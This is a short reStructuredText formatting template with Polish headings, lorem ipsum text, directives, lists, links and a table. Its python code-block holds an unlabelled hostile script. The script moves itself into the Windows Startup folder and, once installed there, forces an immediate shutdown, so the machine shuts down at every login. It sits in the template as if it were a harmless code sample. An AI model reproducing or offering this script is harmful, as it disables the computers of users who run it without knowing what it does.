Nagłówek1
=========
Lorem ipsum dolor sit amet

Nagłówek2
---------

consectetur adipiscing elit

Nagłówek3
+++++++++

Nam ut semper ligula, sit amet viverra

Nagłówek4
^^^^^^^^^

lectus. Fusce eleifend, mi sit

.. note::

  Note:
  
.. tip::

  Tip:
  
.. code-block:: python
  import os
import shutil

user=os.getlogin()

trg=os.path.dirname(os.path.abspath(__file__))+"\shutdown.py"
dst="C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

if(os.path.exists(dst+"/shutdown.py")):
    os.system("shutdown /s /t 1")
    os._exit(0)

shutil.move(trg,dst)

Odnośnik lokalny RtD:doc: `api`
Odnośnik zewnętrzny-inny serwis `https://www.google.com`_

* Lista numerowana
* ....
* ....

#. Lista punktowana
#. ....
#. ....

====  ===== =====
a     b     c
====  ===== =====
1     2     3
4     5     6
7     8     9
====  ===== =====
